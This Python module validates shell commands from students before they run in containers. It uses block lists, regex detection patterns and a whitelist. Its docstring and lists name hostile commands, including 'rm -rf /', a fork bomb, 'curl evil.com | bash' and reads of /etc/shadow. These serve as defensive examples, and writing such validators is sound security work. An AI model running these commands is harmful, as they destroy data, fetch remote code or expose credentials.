"""
Command Validator - Security Layer for Container Execution

CRITICAL: This prevents command injection attacks!

Students can try to execute dangerous commands like:
- rm -rf /
- curl evil.com | bash
- cat /etc/passwd

This module validates and sanitizes all commands before execution.
"""

import re
import shlex
from typing import List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class CommandRisk(Enum):
    """Risk level of a command"""
    SAFE = "safe"           # npm install, python main.py
    MODERATE = "moderate"   # curl, wget (network access)
    DANGEROUS = "dangerous" # rm -rf, sudo, etc.
    BLOCKED = "blocked"     # Never allow


@dataclass
class ValidationResult:
    """Result of command validation"""
    is_valid: bool
    risk_level: CommandRisk
    sanitized_command: Optional[str]
    error_message: Optional[str]
    blocked_patterns: List[str]


class CommandValidator:
    """
    Validates commands before execution in containers.

    Security Layers:
    1. Blocklist - Commands that are NEVER allowed
    2. Pattern matching - Dangerous patterns blocked
    3. Argument validation - Prevent path traversal
    4. Whitelist mode - Only allow specific commands (optional)
    """

    # BLOCKED COMMANDS - Never execute these
    BLOCKED_COMMANDS = {
        # System destruction
        "rm -rf /",
        "rm -rf /*",
        "rm -rf ~",
        "mkfs",
        "dd if=",
        ":(){:|:&};:",  # Fork bomb

        # Privilege escalation
        "sudo",
        "su ",
        "chmod 777",
        "chown root",

        # System access
        "cat /etc/passwd",
        "cat /etc/shadow",
        "/proc/",
        "/sys/",

        # Container escape
        "docker",
        "kubectl",
        "mount",
        "umount",
        "chroot",

        # Network attacks
        "nc -l",        # Netcat listener
        "nmap",
        "tcpdump",
        "wireshark",
    }

    # BLOCKED PATTERNS - Regex patterns to block
    BLOCKED_PATTERNS = [
        r"rm\s+(-[rf]+\s+)*[/~]",          # rm with root paths
        r">\s*/dev/sd[a-z]",                # Write to disk devices
        r"curl.*\|\s*(ba)?sh",              # Pipe curl to shell
        r"wget.*\|\s*(ba)?sh",              # Pipe wget to shell
        r"eval\s*\(",                       # Eval attacks
        r"base64\s+-d.*\|",                 # Decode and pipe
        r"\$\(.*\)",                        # Command substitution (careful)
        r"`.*`",                            # Backtick execution
        r";\s*rm\s",                        # Command chaining with rm
        r"&&\s*rm\s",                       # Command chaining with rm
        r"\|\|\s*rm\s",                     # Command chaining with rm
        r">\s*/etc/",                       # Write to /etc
        r"python.*-c.*exec",               # Python exec injection
        r"node.*-e.*require\s*\(",         # Node require injection
        r"env\s+.*=.*\s+",                 # Environment variable injection
    ]

    # ALLOWED COMMANDS - Whitelist for strict mode
    ALLOWED_COMMANDS = {
        # Node.js / JavaScript
        "npm": ["install", "run", "start", "build", "test", "init", "ci"],
        "npx": ["*"],  # Allow all npx
        "yarn": ["install", "add", "remove", "build", "start", "test"],
        "pnpm": ["install", "add", "remove", "build", "start", "test"],
        "node": ["*"],
        "tsc": ["*"],
        "vite": ["*"],
        "next": ["dev", "build", "start"],

        # Python
        "python": ["*"],
        "python3": ["*"],
        "pip": ["install", "uninstall", "list", "freeze"],
        "pip3": ["install", "uninstall", "list", "freeze"],
        "uvicorn": ["*"],
        "gunicorn": ["*"],
        "flask": ["run"],
        "django-admin": ["*"],
        "pytest": ["*"],

        # Java
        "java": ["*"],
        "javac": ["*"],
        "mvn": ["clean", "install", "package", "test", "compile", "spring-boot:run"],
        "gradle": ["build", "run", "test", "clean", "bootRun"],

        # Go
        "go": ["run", "build", "test", "mod", "get"],

        # Rust
        "cargo": ["run", "build", "test", "new", "init"],
        "rustc": ["*"],

        # General
        "cat": ["*"],
        "ls": ["*"],
        "pwd": [],
        "echo": ["*"],
        "mkdir": ["*"],
        "cp": ["*"],
        "mv": ["*"],
        "touch": ["*"],
        "head": ["*"],
        "tail": ["*"],
        "grep": ["*"],
        "find": ["*"],
        "curl": ["*"],  # Allow but monitor
        "wget": ["*"],  # Allow but monitor
        "git": ["clone", "init", "add", "commit", "status", "diff", "log", "pull", "push"],
        "clear": [],
        "exit": [],
    }

    # PATH TRAVERSAL PATTERNS
    PATH_TRAVERSAL_PATTERNS = [
        r"\.\./",           # ../
        r"\.\.\%2[fF]",     # URL encoded ../
        r"\.\.\\",          # Windows style
        r"/etc/",
        r"/var/",
        r"/usr/",
        r"/root/",
        r"/home/(?!workspace)",  # Only allow /home/workspace
        r"/proc/",
        r"/sys/",
        r"/dev/",
    ]

    def __init__(self, strict_mode: bool = False):
        """
        Initialize validator.

        Args:
            strict_mode: If True, only allow whitelisted commands
        """
        self.strict_mode = strict_mode
        self._compile_patterns()

    def _compile_patterns(self):
        """Compile regex patterns for performance"""
        self._blocked_regex = [re.compile(p, re.IGNORECASE) for p in self.BLOCKED_PATTERNS]
        self._path_regex = [re.compile(p, re.IGNORECASE) for p in self.PATH_TRAVERSAL_PATTERNS]

    def validate(self, command: str) -> ValidationResult:
        """
        Validate a command for safe execution.

        Args:
            command: Command string to validate

        Returns:
            ValidationResult with safety assessment
        """
        if not command or not command.strip():
            return ValidationResult(
                is_valid=False,
                risk_level=CommandRisk.BLOCKED,
                sanitized_command=None,
                error_message="Empty command",
                blocked_patterns=[]
            )

        command = command.strip()
        blocked_patterns = []

        # Check 1: Exact blocklist match
        for blocked in self.BLOCKED_COMMANDS:
            if blocked in command.lower():
                return ValidationResult(
                    is_valid=False,
                    risk_level=CommandRisk.BLOCKED,
                    sanitized_command=None,
                    error_message=f"Blocked command pattern: {blocked}",
                    blocked_patterns=[blocked]
                )

        # Check 2: Regex pattern matching
        for pattern in self._blocked_regex:
            if pattern.search(command):
                blocked_patterns.append(pattern.pattern)

        if blocked_patterns:
            return ValidationResult(
                is_valid=False,
                risk_level=CommandRisk.BLOCKED,
                sanitized_command=None,
                error_message=f"Dangerous pattern detected",
                blocked_patterns=blocked_patterns
            )

        # Check 3: Path traversal
        for pattern in self._path_regex:
            if pattern.search(command):
                return ValidationResult(
                    is_valid=False,
                    risk_level=CommandRisk.BLOCKED,
                    sanitized_command=None,
                    error_message="Path traversal detected",
                    blocked_patterns=[pattern.pattern]
                )

        # Check 4: Whitelist validation (strict mode)
        if self.strict_mode:
            is_allowed, error = self._check_whitelist(command)
            if not is_allowed:
                return ValidationResult(
                    is_valid=False,
                    risk_level=CommandRisk.BLOCKED,
                    sanitized_command=None,
                    error_message=error,
                    blocked_patterns=[]
                )

        # Check 5: Determine risk level
        risk_level = self._assess_risk(command)

        # Sanitize command
        sanitized = self._sanitize(command)

        return ValidationResult(
            is_valid=True,
            risk_level=risk_level,
            sanitized_command=sanitized,
            error_message=None,
            blocked_patterns=[]
        )

    def _check_whitelist(self, command: str) -> Tuple[bool, Optional[str]]:
        """Check if command is in whitelist"""
        try:
            parts = shlex.split(command)
            if not parts:
                return False, "Empty command"

            base_cmd = parts[0].split("/")[-1]  # Handle full paths

            if base_cmd not in self.ALLOWED_COMMANDS:
                return False, f"Command '{base_cmd}' not in whitelist"

            allowed_args = self.ALLOWED_COMMANDS[base_cmd]

            # "*" means all arguments allowed
            if "*" in allowed_args:
                return True, None

            # Empty list means no arguments allowed
            if not allowed_args and len(parts) > 1:
                return False, f"Command '{base_cmd}' does not accept arguments"

            # Check first argument against whitelist
            if len(parts) > 1 and allowed_args:
                first_arg = parts[1]
                if first_arg not in allowed_args and "*" not in allowed_args:
                    return False, f"Argument '{first_arg}' not allowed for '{base_cmd}'"

            return True, None

        except ValueError as e:
            return False, f"Invalid command syntax: {e}"

    def _assess_risk(self, command: str) -> CommandRisk:
        """Assess risk level of a command"""
        command_lower = command.lower()

        # Network commands are moderate risk
        network_commands = ["curl", "wget", "nc", "ssh", "scp", "rsync"]
        for nc in network_commands:
            if nc in command_lower:
                return CommandRisk.MODERATE

        # File deletion is moderate risk
        if "rm " in command_lower:
            return CommandRisk.MODERATE

        # Package installation is moderate risk
        if "install" in command_lower:
            return CommandRisk.MODERATE

        return CommandRisk.SAFE

    def _sanitize(self, command: str) -> str:
        """
        Sanitize command for safe execution.

        Note: We don't heavily modify the command, just ensure
        it doesn't have obvious injection patterns.
        """
        # Remove null bytes
        command = command.replace("\x00", "")

        # Remove ANSI escape codes
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        command = ansi_escape.sub('', command)

        # Limit command length
        if len(command) > 10000:
            command = command[:10000]

        return command.strip()

    def validate_file_path(self, path: str, base_path: str = "/workspace") -> ValidationResult:
        """
        Validate a file path for safe access.

        Args:
            path: File path to validate
            base_path: Allowed base directory

        Returns:
            ValidationResult
        """
        if not path:
            return ValidationResult(
                is_valid=False,
                risk_level=CommandRisk.BLOCKED,
                sanitized_command=None,
                error_message="Empty path",
                blocked_patterns=[]
            )

        # Check path traversal
        for pattern in self._path_regex:
            if pattern.search(path):
                return ValidationResult(
                    is_valid=False,
                    risk_level=CommandRisk.BLOCKED,
                    sanitized_command=None,
                    error_message="Path traversal detected",
                    blocked_patterns=[pattern.pattern]
                )

        # Ensure path is within base_path
        from pathlib import Path
        try:
            resolved = Path(base_path) / path
            resolved = resolved.resolve()
            base_resolved = Path(base_path).resolve()

            if not str(resolved).startswith(str(base_resolved)):
                return ValidationResult(
                    is_valid=False,
                    risk_level=CommandRisk.BLOCKED,
                    sanitized_command=None,
                    error_message="Path outside allowed directory",
                    blocked_patterns=[]
                )
        except Exception as e:
            return ValidationResult(
                is_valid=False,
                risk_level=CommandRisk.BLOCKED,
                sanitized_command=None,
                error_message=f"Invalid path: {e}",
                blocked_patterns=[]
            )

        return ValidationResult(
            is_valid=True,
            risk_level=CommandRisk.SAFE,
            sanitized_command=str(resolved),
            error_message=None,
            blocked_patterns=[]
        )


# Singleton instance
_validator: Optional[CommandValidator] = None


def get_command_validator(strict_mode: bool = False) -> CommandValidator:
    """Get the global command validator instance"""
    global _validator

    if _validator is None:
        _validator = CommandValidator(strict_mode=strict_mode)

    return _validator
